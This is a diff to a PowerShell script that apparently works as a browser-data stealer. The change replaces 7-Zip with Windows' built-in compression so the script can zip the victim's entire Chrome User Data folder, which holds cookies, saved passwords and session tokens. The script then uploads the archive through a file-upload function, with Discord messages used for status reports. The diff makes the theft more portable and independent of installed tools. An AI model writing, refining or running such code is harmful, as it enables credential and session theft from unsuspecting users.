@@ -83,35 +83,38 @@ function Upload-FileAndGetLink {
     }
 }
 
-# Check for 7zip path
-$zipExePath = "C:\Program Files\7-Zip\7z.exe"
-if (-not (Test-Path $zipExePath)) {
-    $zipExePath = "C:\Program Files (x86)\7-Zip\7z.exe"
+# Function to use Windows' built-in compression
+function Zip-WithWindows {
+    param (
+        [string]$sourceFolder,
+        [string]$zipPath
+    )
+
+    # Create a compressed folder
+    $shell = New-Object -ComObject Shell.Application
+    $zipFile = $shell.NameSpace($zipPath)
+
+    if (-not $zipFile) {
+        # Create an empty ZIP file
+        Set-Content $zipPath ([System.Byte[]]@(80, 75, 5, 6, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0))
+        Start-Sleep -Seconds 1
+        $zipFile = $shell.NameSpace($zipPath)
+    }
+
+    # Add files to ZIP
+    $source = $shell.NameSpace($sourceFolder).Items()
+    $zipFile.CopyHere($source)
+
+    # Wait to finish
+    Start-Sleep -Seconds 5
 }
 
-# Check for Chrome user data path
+# Define paths
 $chromePath = "$env:LOCALAPPDATA\Google\Chrome\User Data"
-if (-not (Test-Path $chromePath)) {
-    Send-DiscordMessage -message "Chrome User Data path not found!"
-    Add-Content -Path $logFile -Value "Chrome User Data path not found!"
-    exit
-}
-
-# Exit if 7zip is not found
-if (-not (Test-Path $zipExePath)) {
-    Send-DiscordMessage -message "7-Zip path not found!"
-    Add-Content -Path $logFile -Value "7-Zip path not found!"
-    exit
-}
-
-# Create a zip of the Chrome User Data
 $outputZip = "$env:TEMP\chrome_data.zip"
-& $zipExePath a -r $outputZip $chromePath
-if ($LASTEXITCODE -ne 0) {
-    Send-DiscordMessage -message "Error creating zip file with 7-Zip"
-    Add-Content -Path $logFile -Value "Error creating zip file with 7-Zip"
-    exit
-}
+
+# Use built-in compression instead of 7-Zip
+Zip-WithWindows -sourceFolder $chromePath -zipPath $outputZip
 
 # Upload the file and get the link
 $link = Upload-FileAndGetLink -filePath $outputZip
